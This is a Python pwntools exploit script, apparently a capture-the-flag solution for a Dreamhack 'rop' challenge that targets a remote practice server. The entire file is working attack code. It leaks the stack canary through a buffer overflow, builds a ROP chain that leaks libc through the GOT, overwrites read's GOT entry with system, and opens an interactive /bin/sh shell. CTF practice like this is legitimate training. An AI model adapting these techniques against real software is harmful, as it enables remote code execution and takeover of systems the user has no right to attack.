from pwn import *

context.arch = "amd64"
p = remote('host3.dreamhack.games', 16887)
e = ELF('./rop')
libc = ELF('./libc.so.6')

# Leak canary

payload = b'a'*0x38
p.sendafter(b'Buf: ', payload+b'a')
p.recvuntil(payload + b'a')
canary = b'\x00' + p.recvn(7)

# Exploit

read_plt = e.plt['read'] # == read_plt = e.symbols['read']
read_got = e.got['read'] # 여기서는 got 주소만 알 수 있고 got 주소 안의 내용은 알 수 없음
write_plt = e.plt['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']

pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload += canary + b'a'*0x8
payload += p64(ret) # to set stack 0x10

# write(1, read_got, ...)

payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# read(0, read_got, ...)

payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(read_plt)

# read('/bin/sh') == system('/bin/sh')

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)

read = p.recvn(8)
system = u64(read) - read_system_offset

# read = p.recv(6)
# system = u64(read + b'\x00\x00') - read_system_offset

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
